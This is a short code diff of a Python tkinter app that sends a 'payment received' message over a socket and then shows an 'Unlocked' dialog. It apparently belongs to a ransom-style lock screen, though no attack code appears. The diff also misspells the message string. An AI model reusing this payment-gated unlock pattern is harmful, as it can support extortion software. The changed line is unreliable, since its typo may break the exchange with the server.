@@ -1,4 +1,5 @@
 import tkinter
+import uuid
 from tkinter.ttk import *
 from tkinter import Tk
 from PIL import ImageTk, Image
@@ -17,7 +18,7 @@ class App(Thread):
         self.root.quit()
 
     def dialog1(self):
-        self.conn.send(bytes('payment_received','utf8'))
+        self.conn.send(b'payment_recieved')
         box.showinfo('info','Unlocked')
 
         payment = ""
